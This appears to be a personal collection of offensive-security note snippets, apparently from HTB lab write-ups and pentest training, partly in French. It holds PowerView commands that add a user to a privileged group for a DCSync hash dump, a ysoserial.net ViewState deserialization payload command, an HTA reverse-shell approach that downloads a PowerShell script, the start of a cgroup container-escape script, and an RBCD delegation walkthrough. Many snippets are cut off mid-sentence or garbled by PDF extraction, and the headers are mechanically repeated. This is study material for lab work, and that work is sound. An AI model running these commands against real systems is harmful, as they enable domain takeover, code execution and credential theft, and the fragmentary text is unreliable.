#cat/CODE #cpts
```
(&( | ( | (samAccountName=ttimmons)(name=ttimmons)(displayname=ttimmons))))
```

## Powershell - Powershell - Powershell - Powershell - Powershell - after-obtaining-domain-admin-rights-authenticate-to-the-domain-control
#cat/CODE #cpts
Now that students have obtained the password for the `ttimons` user from the previous question (i.e., `Repeat09`), they need to place him in the `Server Admins` group, thus allowing for a DCSync attack and dumping all ha

```
$timpass = ConvertTo-SecureString 'Repeat09' -AsPlainText -Force
```

## Powershell - Powershell - Powershell - Powershell - Powershell - after-obtaining-domain-admin-rights-authenticate-to-the-domain-control-2
#cat/CODE #cpts
Now that students have obtained the password for the `ttimons` user from the previous question (i.e., `Repeat09`), they need to place him in the `Server Admins` group, thus allowing for a DCSync attack and dumping all ha

```
$timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
```

## Powershell - Powershell - Powershell - Powershell - Powershell - after-obtaining-domain-admin-rights-authenticate-to-the-domain-control-3
#cat/CODE #cpts
Now that students have obtained the password for the `ttimons` user from the previous question (i.e., `Repeat09`), they need to place him in the `Server Admins` group, thus allowing for a DCSync attack and dumping all ha

```
$group = Convert-NameToSid "Server Admins"
```

## Powershell - Powershell - Powershell - Powershell - Powershell - after-obtaining-domain-admin-rights-authenticate-to-the-domain-control-4
#cat/CODE #cpts
Now that students have obtained the password for the `ttimons` user from the previous question (i.e., `Repeat09`), they need to place him in the `Server Admins` group, thus allowing for a DCSync attack and dumping all ha

```
Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
```

## Powershell - Powershell - Powershell - Powershell - Powershell - after-obtaining-domain-admin-rights-authenticate-to-the-domain-control-5
#cat/CODE #cpts
```
VERBOSE: [Get-PrincipalContext] Using alternate credentials
```

## Powershell - Powershell - Powershell - Powershell - Powershell - deserialization
#cat/CODE #cpts
VM Windows où ysoserial.net est présent

```
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties --path="/portfolio" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" -c "powershell -enc <payload>"
```

## Powershell - Powershell - Powershell - Powershell - Powershell - tombwatcher
#cat/CODE #cpts
extrait du PDF Joplin: tombwatcher

```
Get-ADObject - Filter 'objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' - IncludeDeletedObjects - Properties * accountExpires : 9223372036854775807 badPasswordTime : 0 badPwdCount : 0 CanonicalName : tombwatcher . htb / Deleted Objects / cert_admin DEL : 938182 c3-bf0b-410a-9aaa-45c8e1a02ebf CN : cert_admin DEL : 938182 c3-bf0b-410a-9aaa-45c8e1a02ebf codePage : 0 countryCode : 0 Created : 11 / 16 / 2024 12 : 07 : 04 PM createTimeStamp : 11 / 16 / 2024 12 : 07 : 04 PM Deleted : True Description : DisplayName : DistinguishedName : CN = cert_admin \n0 ADEL : 938182 c3-bf0b-410a-9aa
```

## Powershell - Powershell - Powershell - Powershell - Powershell - freelancer
#cat/CODE #cpts
extrait du PDF Joplin: freelancer

```
sudo mkdir /mnt/memprocfs
```

## Powershell - Powershell - Powershell - Powershell - Powershell - analysis
#cat/CODE #cpts
extrait du PDF Joplin: analysis

```
shell.hta This time, the application responds with File is not safe. , but again, we do not get a reply back to our listener. Since hta files seem to be handled differently, we will try to upload a custom hta reverse shell in order to see if we can bypass any security limitations and achieve code execution with an hta file. This custom hta file will download a PowerShell script that will contain the reverse shell, to see if the hta file is executed, since we will be able to see the request to our web server. shell.hta <! DOCTYPE html
```

## Powershell - Powershell - Powershell - Powershell - Powershell - analysis-2
#cat/CODE #cpts
extrait du PDF Joplin: analysis

```
type encoded . txt ----- BEGIN ENCODED MESSAGE ----- Version : BCTextEncoder Utility v .1.03.2.1 wy4ECQMCq0jPQTxt + 3 BgTzQTBPQFbt5KnV7LgBq6vcKWtbdKAf59hbw0KGN9lBIK 0 kcBSYXfHU2s7xsWA3pCtjthI0lge3SyLOMw9T81CPqT3HOIKkh3SVcO9jdrxfwu pHnjX + 5 HyybuBwIQwGprgyWdGnyv3mfcQQ == = a7bc ----- END ENCODED MESSAGE ----- Get-Process Reverse Engineering BCTextEncoder Since the goal here is to intercept possible password submission by the user, we can use a tool like ApiMonitor to check how a submitted password is handled by the application on the API level. We submit the password testtest during the encod
```

## Powershell - Powershell - Powershell - Powershell - Powershell - carpediem
#cat/CODE #cpts
extrait du PDF Joplin: carpediem

```
./escape.sh #!/bin/bash subsys=\$1 mountDir=\$2 host_path=\$3 mount -t cgroup -o \$subsys cgroup \$mountDir if [ ! -d \$mountDir/x ] then mkdir \$mountDir/x fi cd \$mountDir/x echo 1
```

## Powershell - Powershell - Powershell - Powershell - Powershell - rebound
#cat/CODE #cpts
extrait du PDF Joplin: rebound

```
Get-DomainObject -Identity delegator$ msDS-AllowedToActOnBehalfOfOtherIdentity : AQAEgEAAAAAAAAAAAAAAABQAAAAEACwAAQAAAAAAJAD/AQ8AAQUAAAAAAAUVAAAAnSwX8yHn8FjpghKZA R4AAAECAAAAAAAFIAAAACACAAA= We are now ready to perform the RBCD. The idea is that we can request a ticket from ldap_monitor on delegator$ as any account, creating a forwardable ST for the impersonated account, on delegator$ . We will impersonate DC01$ , because Administrator is marked as sensitive and cannot be delegated: The forwardable ST can then be forwarded to the DC, using delegator$ 's constrained pr
```

## Powershell - Powershell - Powershell - Powershell - Powershell - napper
#cat/CODE #cpts
extrait du PDF Joplin: napper

```
shell powershell.exe PS
```

